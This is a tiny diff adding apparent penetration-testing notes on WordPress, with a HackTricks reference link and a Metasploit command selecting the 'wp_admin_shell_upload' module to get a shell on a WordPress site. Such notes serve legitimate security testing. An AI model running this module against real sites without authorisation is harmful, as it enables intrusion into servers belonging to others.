@@ -1,0 +1,6 @@
+# refer: https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress
+
+--- POST
+
+# MSF get shell
+use exploit/unix/webapp/wp_admin_shell_upload
